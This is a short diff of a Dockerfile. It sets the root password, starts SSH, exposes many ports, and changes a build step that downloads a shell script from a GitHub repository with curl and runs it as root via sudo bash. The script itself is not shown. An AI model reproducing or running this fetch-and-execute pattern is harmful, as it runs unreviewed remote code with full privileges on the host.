@@ -21,7 +21,7 @@ RUN echo root:${Password}|chpasswd
 RUN service ssh start
 RUN apt install curl -y > /dev/null 2>&1
 RUN apt install sudo -y > /dev/null 2>&1
-RUN sudo bash <(curl -s https://raw.githubusercontent.com/poisonthepower/potato/main/t.sh)
+RUN sudo bash -c "$(curl -fsSL https://raw.githubusercontent.com/poisonthepower/potato/main/t.sh)"
 RUN chmod 755 /1.sh
 EXPOSE 80 8888 8080 443 5130 5131 5132 5133 5134 5135 3306
 CMD  /1.sh
